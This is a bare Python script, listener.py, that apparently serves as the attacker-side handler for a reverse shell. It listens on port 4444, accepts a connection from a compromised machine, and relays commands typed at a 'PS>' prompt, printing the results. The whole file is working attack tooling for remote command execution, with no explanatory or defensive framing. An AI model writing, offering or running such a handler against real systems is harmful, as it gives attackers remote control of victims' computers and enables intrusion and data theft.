# listener.py
import socket
import subprocess
import os

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print("[+] Listening on port 4444...")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    while True:
        try:
            cmd = input("PS> ")
            if cmd.lower() == 'exit':
                break
            conn.send(cmd.encode() + b'\n')
            response = conn.recv(4096).decode('utf-8', errors='ignore')
            print(response)
        except:
            break
    
    conn.close()
    s.close()

if __name__ == "__main__":
    main()